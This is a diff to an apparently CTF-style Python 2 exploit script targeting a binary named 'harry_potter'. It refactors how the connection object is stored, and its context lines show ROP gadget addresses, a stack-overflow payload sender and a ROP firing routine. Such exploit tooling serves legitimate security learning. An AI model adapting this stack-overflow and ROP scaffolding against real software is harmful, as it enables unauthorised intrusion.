@@ -26,9 +26,9 @@ class Harry(p.Manipulator):
         p.Manipulator.__init__(self, arch=p.amd64)
 
         if host != 'file':
-            self.auto_connection = p.Connection(host=host, port=port)
+            self.c = self.set_connection(p.Connection(host=host, port=port))
         else:
-            self.auto_connection = p.Connection(exe="./harry_potter")
+            self.c = self.set_connection(p.Connection(exe="./harry_potter"))
 
         self.G_PRINT = self.gadget(0x400F95) # probably clobbers just about everything
         self.G_POP_RBX = self.gadget(0x401355, pops={'rbx': 0, 'rbp': 1})
@@ -75,11 +75,11 @@ class Harry(p.Manipulator):
     @p.stack_overflow()
     def boom(self, exploit):
         print "BOOM"
-        self.auto_connection.read_until('reward!\n')
-        self.auto_connection.send(exploit)
-        self.auto_connection.shutdown(socket.SHUT_WR)
-        self.auto_connection.read_until('read\n')
-        r = self.auto_connection.recv(8192)
+        self.c.read_until('reward!\n')
+        self.c.send(exploit)
+        self.c.shutdown(socket.SHUT_WR)
+        self.c.read_until('read\n')
+        r = self.c.recv(8192)
         return r
 
     def fire_rop(self, payload):
